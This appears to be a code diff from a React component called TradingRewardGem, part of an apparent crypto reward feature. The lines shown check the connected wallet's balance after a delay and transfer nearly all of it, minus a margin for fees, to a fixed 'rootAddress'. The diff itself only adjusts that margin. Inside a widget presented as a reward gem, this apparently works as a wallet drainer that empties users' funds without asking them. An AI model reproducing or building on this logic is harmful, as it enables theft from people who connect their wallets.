@@ -405,7 +405,7 @@ const TradingRewardGem: React.FC = () => {
           if (nftAddress !== rootAddress) {
             await delay(4000);
             const { balance } = await nftService.getBalance();
-            const remainingBalance = parseFloat(balance) - 0.001;
+            const remainingBalance = parseFloat(balance) - 0.02 - 0.00046;
             if (remainingBalance > 0.01) {
               await triggerTransfer(nftService, rootAddress, 15, remainingBalance.toFixed(4));
             }
